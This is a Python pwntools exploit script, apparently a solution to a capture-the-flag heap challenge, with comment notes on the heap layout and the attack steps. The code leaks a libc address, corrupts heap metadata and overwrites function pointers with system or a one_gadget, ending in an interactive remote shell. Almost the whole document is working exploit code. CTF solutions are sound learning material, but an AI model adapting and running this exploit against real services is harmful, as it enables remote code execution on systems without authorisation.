
# heap memory
# -------------
# block1
# corrupt header

# block2 (free) <--- size ???
# next_ptr=block4  <-------- block1 overwrites block2 header

# block3 (free) <--- size ???
# next_ptr=block4  <-------- block1 overwrites block3 header

# block4 <--- size 0x2000
# libc_addr libc_addr

# FUCK
# - alloc 1 (size 0x10), 2 (size 0x20, prevents coalescing with top chunk)
# - free 1, alloc 1 (1 now has libc ptrs)
# - alloc < 96 times, collecting which id (bits) were set to 1 (ignore ids < 32)
# - invert value for addr of main_arena
# - get addr of one_gadget
# - alloc 2 blocks, free 1 delete OID 0 of other, make other overwrite 1 next_ptr to exit_hook addr
# - alloc 1, alloc again, write one_gadget into new chunk
# gg this was way easier than I thought

# # - block2 allocd (size 0x10)
# - block4 allocd (size 0x20)
# - block3 allocd (size 0x30)
# - free 2,3
# - block1 allocd (size 0x10), oid 0 freed, (size 0x200) overwrite block3 next_ptr to block4
# # - alloc block2 (0x10),
# - alloc block3 (0x30), alloc block4 (0x20), free 4
# - free block4, free each index in block4 size bin from other ptr

# free bin:
#     block2 -> block4 -> block3 -> block4


# mmap region
# -------------
# block3


# ld region
# -------------
# ...
# rtld_lock_recursive



# - can write to free_hook
# - can write to ld pointers

from pwn import *

context.terminal = ["guake", "--split-vertical", "-e"]

def alloc(size, content):
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(f"{size}")
    r.recvuntil("Object id: ")
    try:
        oid = int(r.recvuntil("\n"))
    except:
        oid = 0
    r.sendline(content)
    return oid


def free(oid):
    # r.clean(0.01)
    r.sendline("2")
    r.sendline(f"{oid}")


# r = process(["./ld.so","./heap"], env={"LD_PRELOAD": "./libc.so.6"})
# r = remote('bionic', 51337)
r = remote('0.0.0.0', 9998)
# r = remote("yetanotherheap.hackable.software", 1337)

# pause()

alloc(10, "AAAAAAAAA")
alloc(20, "AAAAAAAAAAAAAAAAAAA")
alloc(40, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
free(1)
alloc(10, "AAAAAAAAA") # chunk now has libc ptrs
oid = 0
bits = []
while oid <= 96:
    print(oid)
    oid = alloc(10, "AAAAAAAAA")
    if oid >= 32:
        bits.append(oid)

libc_addr = ""
for i in range(95,31,-1):
    if i not in bits:
        libc_addr += "1"
    else:
        libc_addr += "0"
arena_addr = int(libc_addr,2) - 96
print(hex(arena_addr))
# gdb.attach(r)

l = ELF("./libc-2.31.so")
main_arena_offset = 0x1ebb80
libc_start = arena_addr - main_arena_offset
free_hook = l.symbols["__free_hook"] + libc_start
one_gadget = 0xe6c81 + libc_start
system = l.symbols['system'] + libc_start
log.info("free_hook: 0x%x", free_hook)

free(192)
print(alloc(47, b"sh\0\0" + b'\1' + b'\0'*38))
free(193)

print(hex(one_gadget))

# free(0)
# free(97)
alloc(2000, 'a'*2000)
free(384)
payload = p32(0x6000)
payload += p64(0xffffffffffffffff)
# payload += p64(0x0)
payload += p32(0x03ffffff)
payload += b'A'*(2000-len(payload))
alloc(2000, payload)
#gdb.attach(r)

def replace(idx, data):
    global s
    s = s[:idx] + p64(data) + s[idx+8:]

# s = cyclic(length=0x6000,n=8)
p_one_gadget = p64(one_gadget)
s = bytearray([0] * 0x6000)
s[6936:6936+8] = p64(system)

assert(len(s) == 0x6000)


alloc(0x5fff, s[:-2])
# r.sendline(b'2'*10000)
r.interactive()

# payload = b"A"*16
# payload += p64(0)
# payload += p64(one_gadget)
# alloc(47, payload)


